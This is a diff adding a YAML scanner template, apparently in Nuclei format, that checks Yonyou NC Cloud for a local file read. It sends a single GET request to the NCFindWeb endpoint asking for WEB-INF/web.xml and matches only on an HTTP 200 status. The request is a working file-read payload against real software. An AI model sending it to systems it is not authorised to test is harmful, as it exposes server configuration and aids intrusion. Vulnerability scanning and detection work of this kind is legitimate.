@@ -1,0 +1,18 @@
+id: yaml-poc-yonyou-yonyou_nc_cloud-readfile-CT-158094
+info:
+  name: Yaml Poc Yonyou Yonyou_Nc_Cloud Readfile Ct 158094
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_nc_cloud-readfile-CT-158094'
+  tags: lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
